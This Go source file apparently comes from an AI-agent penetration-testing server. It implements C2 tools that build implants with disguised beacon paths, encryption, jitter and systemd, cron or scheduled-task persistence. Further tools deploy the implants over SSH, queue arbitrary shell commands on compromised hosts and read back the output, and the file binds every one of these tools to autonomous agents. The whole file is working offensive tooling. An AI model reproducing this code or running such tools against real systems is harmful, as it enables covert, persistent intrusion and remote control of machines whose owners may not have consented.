package server

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/Autumn-27/artex/c2"
	"github.com/Autumn-27/artex/server/targets"
	actool "github.com/Autumn-27/norma/tool"
)

// c2PublicBaseURL resolves the callback base URL advertised to implants:
// ARTEX_C2_PUBLIC_URL wins, then a plain http://127.0.0.1 fallback the
// operator should override.
func c2PublicBaseURL() string {
	if v := strings.TrimSpace(os.Getenv("ARTEX_C2_PUBLIC_URL")); v != "" {
		return v
	}
	if addr := c2.ListenAddr(); addr != "" {
		if strings.HasPrefix(addr, ":") {
			return "http://127.0.0.1" + addr
		}
		return "http://" + addr
	}
	return "http://127.0.0.1:8080"
}

// c2Manager lazily initializes the C2 manager, HTTP handlers and the optional
// dedicated listener. Returns nil when no dataDir is configured.
func (s *Server) c2Manager() *c2.Manager {
	s.c2Mu.Lock()
	defer s.c2Mu.Unlock()
	if s.c2mgr != nil {
		return s.c2mgr
	}
	if s.dataDir == "" {
		return nil
	}
	mgr, err := c2.NewManager(filepath.Join(s.dataDir, "c2"))
	if err != nil {
		log.Printf("[c2] init: %v", err)
		return nil
	}
	s.c2mgr = mgr
	s.c2Handler = &c2.Handler{M: mgr}
	s.c2Console = &c2.Console{M: mgr}
	s.startC2ListenerLocked()
	log.Printf("[c2] ready (%d implants restored)", mgr.Count())
	return mgr
}

// startC2ListenerLocked serves the beacon endpoints + console on a dedicated
// listener when ARTEX_C2_ADDR is set. Callers hold s.c2Mu.
func (s *Server) startC2ListenerLocked() {
	addr := c2.ListenAddr()
	if addr == "" || s.c2Handler == nil {
		return
	}
	mux := http.NewServeMux()
	c2.RegisterHandler(mux, s.c2Handler)
	c2.RegisterConsole(mux, s.c2Console)
	srv := &http.Server{Addr: addr, Handler: mux, ReadHeaderTimeout: 10 * time.Second}
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Printf("[c2] dedicated listener %s: %v", addr, err)
		return
	}
	s.c2srv = srv
	go func() {
		cert, key := os.Getenv("ARTEX_C2_TLS_CERT"), os.Getenv("ARTEX_C2_TLS_KEY")
		var serr error
		if cert != "" && key != "" {
			serr = srv.ServeTLS(ln, cert, key)
		} else {
			serr = srv.Serve(ln)
		}
		if serr != nil && serr != http.ErrServerClosed {
			log.Printf("[c2] listener: %v", serr)
		}
	}()
	log.Printf("[c2] dedicated listener on %s", ln.Addr())
}

// c2Tools returns the C2 agent tools (implant build/deploy + operator loop).
func (s *Server) c2Tools() []actool.CoreTool {
	return []actool.CoreTool{
		s.toolC2BuildImplant(),
		s.toolC2Deploy(),
		s.toolC2Agents(),
		s.toolC2Task(),
		s.toolC2Results(),
		s.toolC2Kill(),
	}
}

// seedC2ToolsV1 seeds the C2 agent tools into the tools table and binds them
// to the operational + reporting agents (one-shot, settings-flag guarded).
func (s *Server) seedC2ToolsV1() {
	const flag = "c2_tools_v1"
	if v, _, _ := s.m.pg.GetSetting(flag); v == "true" {
		return
	}
	tools := s.c2Tools()
	for _, t := range tools {
		schema, _ := json.Marshal(t.InputSchema())
		binds, _ := json.Marshal([]string{"auto", "pentest", "worker", "planner", "mainagent", "reporter"})
		_ = s.m.pg.SeedTool(t.Name(), t.Description(), schema, binds)
		_ = s.m.pg.RefreshToolDefaults(t.Name(), t.Description(), schema)
	}
	keys := make([]string, 0, len(tools))
	for _, t := range tools {
		keys = append(keys, t.Name())
	}
	for _, agKey := range []string{"auto", "pentest", "worker", "planner", "mainagent", "reporter"} {
		_ = s.m.pg.AddAgentToToolBinding(agKey, keys)
	}
	_ = s.m.pg.SetSetting(flag, "true")
}

func (s *Server) toolC2BuildImplant() actool.CoreTool {
	return wrTool("c2_build_implant",
		"Generate a self-contained C2 implant (bash, python3, or powershell) with a malleable beacon profile, optional install-time persistence, and install helpers; registers it with the ARTEX C2 listener.",
		objSchema(map[string]any{
			"label":         strParam("Operator label for the implant (optional)"),
			"platform":      strParam("Target platform: linux (default) or windows"),
			"runtime":       strParam("Implant runtime: bash (linux default), python3 (linux), powershell (windows default)"),
			"encrypt":       strParam("Payload encoding: none (default) or aes (AES-256-CBC with per-implant key; not for python3)"),
			"beacon_path":   strParam("Malleable check-in path, e.g. assets/font.css (default update; must not collide with api/c2 or c2/ui)"),
			"resp_path":     strParam("Malleable result path, e.g. assets/glyph.bin (default response; must differ from beacon_path)"),
			"sleep_seconds": map[string]any{"type": "integer", "description": "Base check-in interval in seconds (default 30, max 86400)"},
			"jitter_pct":    map[string]any{"type": "integer", "description": "Sleep jitter percent (default 20, max 80)"},
			"persistence":   strParam("Install-time persistence: none (default), systemd|cron (linux), schtasks (windows)"),
			"base_url":      strParam("Callback base URL, e.g. https://c2.example.com (default ARTEX_C2_PUBLIC_URL or local listener)"),
		}),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			mgr := s.c2Manager()
			if mgr == nil {
				return actool.Errorf("c2 manager unavailable (no data dir)"), nil
			}
			var a struct {
				Label        string `json:"label"`
				Platform     string `json:"platform"`
				Runtime      string `json:"runtime"`
				Encrypt      string `json:"encrypt"`
				BeaconPath   string `json:"beacon_path"`
				RespPath     string `json:"resp_path"`
				SleepSeconds int    `json:"sleep_seconds"`
				JitterPct    int    `json:"jitter_pct"`
				Persistence  string `json:"persistence"`
				BaseURL      string `json:"base_url"`
			}
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf(fmt.Sprintf("invalid input JSON: %v", err)), nil
			}
			if strings.TrimSpace(a.BaseURL) == "" {
				a.BaseURL = c2PublicBaseURL()
			}
			im, err := mgr.BuildImplant(c2.BuildOpts{
				Label: a.Label, Platform: a.Platform, Runtime: a.Runtime, Encrypt: a.Encrypt,
				BeaconPath: a.BeaconPath, RespPath: a.RespPath, SleepSeconds: a.SleepSeconds,
				JitterPct: a.JitterPct, Persistence: a.Persistence, BaseURL: a.BaseURL,
			})
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			buildDir := mgr.BuildDir(im.ID)
			files := []string{}
			if entries, err := os.ReadDir(buildDir); err == nil {
				for _, e := range entries {
					files = append(files, filepath.Join(buildDir, e.Name()))
				}
			}
			return jsonResult(map[string]any{
				"implant":       im,
				"status":        im.Status(),
				"build_dir":     buildDir,
				"files":         files,
				"beacon_url":    c2.CallbackURL(im, im.BaseURL),
				"result_url":    c2.ResultURL(im, im.BaseURL),
				"deploy_hint":   "Upload the build_dir files to the target (c2_deploy with target_id), then the installer runs automatically.",
				"console_token": mgr.ConsoleToken(),
			})
		})
}

func (s *Server) toolC2Deploy() actool.CoreTool {
	return wrTool("c2_deploy",
		"Upload a generated C2 implant and its installer to a connected SSH target and run the installer (with the requested persistence mode).",
		objSchema(map[string]any{
			"implant_id":  strParam("Implant ID from c2_build_implant (c2_...)"),
			"target_id":   strParam("Connected SSH target ID (e.g. ssh-10.0.0.5-22)"),
			"remote_dir":  strParam("Remote staging directory (default /tmp)"),
			"persistence": strParam("Which installer to run: none (default), systemd, cron (linux)"),
		}, "implant_id", "target_id"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			mgr := s.c2Manager()
			if mgr == nil {
				return actool.Errorf("c2 manager unavailable"), nil
			}
			var a struct {
				ImplantID   string `json:"implant_id"`
				TargetID    string `json:"target_id"`
				RemoteDir   string `json:"remote_dir"`
				Persistence string `json:"persistence"`
			}
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf(fmt.Sprintf("invalid input JSON: %v", err)), nil
			}
			im, ok := mgr.Get(a.ImplantID)
			if !ok {
				return actool.Errorf(fmt.Sprintf("unknown implant %q", a.ImplantID)), nil
			}
			if a.Persistence == "" {
				a.Persistence = "none"
			}
			s.targetMu.Lock()
			conn, exist := s.targets[a.TargetID]
			s.targetMu.Unlock()
			if !exist {
				return actool.Errorf(fmt.Sprintf("target %q is not connected", a.TargetID)), nil
			}
			sshConn, ok := conn.(*targets.SSHConnector)
			if !ok {
				return actool.Errorf("c2_deploy currently supports SSH targets only"), nil
			}
			remoteDir := strings.TrimSpace(a.RemoteDir)
			if remoteDir == "" {
				remoteDir = "/tmp"
			}
			if _, err := sshConn.Execute(ctx, "mkdir -p "+shellQuote(remoteDir)); err != nil {
				return actool.Errorf(fmt.Sprintf("mkdir on target: %v", err)), nil
			}
			buildDir := mgr.BuildDir(im.ID)
			uploaded := []string{}
			if entries, err := os.ReadDir(buildDir); err == nil {
				for _, e := range entries {
					if e.IsDir() {
						continue
					}
					sess, err := sshConn.NewSFTPSession()
					if err != nil {
						return actool.Errorf(fmt.Sprintf("sftp: %v", err)), nil
					}
					local := filepath.Join(buildDir, e.Name())
					remote := remoteDir + "/" + e.Name()
					uerr := sess.UploadFile(local, remote)
					_ = sess.Close()
					if uerr != nil {
						return actool.Errorf(fmt.Sprintf("upload %s: %v", e.Name(), uerr)), nil
					}
					uploaded = append(uploaded, remote)
				}
			}
			inst := c2.InstallCommand(&im, a.Persistence, remoteDir)
			res, err := sshConn.Execute(ctx, inst)
			if err != nil {
				return actool.Errorf(fmt.Sprintf("install command failed: %v", err)), nil
			}
			return jsonResult(map[string]any{
				"implant_id": im.ID, "target": sshConn.Target(),
				"uploaded": uploaded, "persistence": a.Persistence,
				"install_command": inst,
				"exit_code":       res.ExitCode, "stdout": strings.TrimSpace(res.Stdout), "stderr": strings.TrimSpace(res.Stderr),
				"beacon_url": c2.CallbackURL(&im, im.BaseURL),
			})
		})
}

func (s *Server) toolC2Agents() actool.CoreTool {
	return roTool("c2_agents",
		"List ARTEX C2 implants with live status (registered/active/stale/killed), host info, and the operator console URL/token.",
		objSchema(map[string]any{}),
		func(_ context.Context, _ json.RawMessage) (actool.Result, error) {
			mgr := s.c2Manager()
			if mgr == nil {
				return actool.Errorf("c2 manager unavailable"), nil
			}
			agents := make([]map[string]any, 0, mgr.Count())
			for _, im := range mgr.List() {
				agents = append(agents, map[string]any{
					"id": im.ID, "label": im.Label, "status": im.Status(),
					"platform": im.Platform, "runtime": im.Runtime, "encrypt": im.Encrypt,
					"host": im.Host, "user": im.User, "os": im.OS, "arch": im.Arch,
					"last_seen": im.LastSeen, "sleep_seconds": im.SleepSeconds,
					"jitter_pct": im.JitterPct, "persistence": im.Persistence,
					"pending_tasks": mgr.PendingCount(im.ID),
				})
			}
			return jsonResult(map[string]any{
				"count":         len(agents),
				"agents":        agents,
				"console_url":   "/c2/ui/?t=" + mgr.ConsoleToken(),
				"console_token": mgr.ConsoleToken(),
				"listener":      c2.ListenAddr(),
			})
		})
}

func (s *Server) toolC2Task() actool.CoreTool {
	return wrTool("c2_task",
		"Queue a shell command for a C2 implant; the output arrives on the next check-in and is readable via c2_results.",
		objSchema(map[string]any{
			"implant_id":      strParam("Implant ID (c2_...)"),
			"command":         strParam("Shell command to execute on the implant host"),
			"timeout_seconds": map[string]any{"type": "integer", "description": "Execution timeout (default 120, max 3600)"},
		}, "implant_id", "command"),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			mgr := s.c2Manager()
			if mgr == nil {
				return actool.Errorf("c2 manager unavailable"), nil
			}
			var a struct {
				ImplantID      string `json:"implant_id"`
				Command        string `json:"command"`
				TimeoutSeconds int    `json:"timeout_seconds"`
			}
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf(fmt.Sprintf("invalid input JSON: %v", err)), nil
			}
			t, err := mgr.AddTask(a.ImplantID, c2.CmdShell, a.Command, a.TimeoutSeconds)
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			return jsonResult(map[string]any{
				"task": t,
				"note": "Result appears after the implant's next check-in; poll c2_results with task_id.",
			})
		})
}

func (s *Server) toolC2Results() actool.CoreTool {
	return roTool("c2_results",
		"Read recent C2 task results (command output) and task states for one implant or all of them.",
		objSchema(map[string]any{
			"implant_id": strParam("Filter by implant ID (optional; all implants when empty)"),
			"limit":      map[string]any{"type": "integer", "description": "How many recent results/tasks to return (default 20, max 100)"},
		}),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			mgr := s.c2Manager()
			if mgr == nil {
				return actool.Errorf("c2 manager unavailable"), nil
			}
			var a struct {
				ImplantID string `json:"implant_id"`
				Limit     int    `json:"limit"`
			}
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf(fmt.Sprintf("invalid input JSON: %v", err)), nil
			}
			return jsonResult(map[string]any{
				"results": mgr.Results(a.ImplantID, a.Limit),
				"tasks":   mgr.Tasks(a.ImplantID, a.Limit),
			})
		})
}

func (s *Server) toolC2Kill() actool.CoreTool {
	return wrTool("c2_kill",
		"Instruct a C2 implant to terminate on its next check-in and remove its persistence (systemd unit / cron entry / scheduled task).",
		objSchema(map[string]any{
			"implant_id": strParam("Implant ID (c2_...)"),
		}, "implant_id"),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			mgr := s.c2Manager()
			if mgr == nil {
				return actool.Errorf("c2 manager unavailable"), nil
			}
			var a struct {
				ImplantID string `json:"implant_id"`
			}
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf(fmt.Sprintf("invalid input JSON: %v", err)), nil
			}
			t, err := mgr.AddTask(a.ImplantID, c2.CmdKill, "", 0)
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			return jsonResult(map[string]any{"task": t, "note": "Implant stops on its next check-in."})
		})
}
